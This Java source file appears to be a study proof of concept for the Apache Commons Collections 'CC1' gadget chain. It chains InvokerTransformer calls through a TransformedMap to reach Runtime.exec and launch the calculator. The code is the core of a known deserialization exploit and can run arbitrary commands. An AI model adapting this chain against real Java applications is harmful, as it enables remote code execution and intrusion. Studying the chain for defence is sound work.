package Clown_CC1;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;
import java.util.HashMap;
import java.util.Map;


public class POC3test {
    public static void main(String[] args) throws Exception {
        Transformer[] transformer =new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
                new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"})
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformer);
        HashMap map = new HashMap();
        map.put("key","value");
        Map<Object,Object> transformedMap = TransformedMap.decorate(map, null, chainedTransformer);
        for (Map.Entry entry:transformedMap.entrySet()){
            entry.setValue("a");
        }
    }
}